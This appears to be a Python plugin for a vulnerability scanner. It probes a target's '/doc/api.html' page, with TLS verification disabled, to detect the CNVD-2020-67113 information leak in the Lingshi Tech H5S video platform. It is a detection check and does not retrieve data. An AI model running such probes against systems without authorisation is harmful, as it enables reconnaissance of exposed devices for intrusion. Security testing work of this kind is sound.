#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80%20H5S%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0%20GetUserInfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%20%20CNVD-2020-67113.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "零视科技 H5S视频平台 GetUserInfo信息泄漏(CNVD-2020-67113)漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/doc/api.html"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "接口" in res.text and "设备管理" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret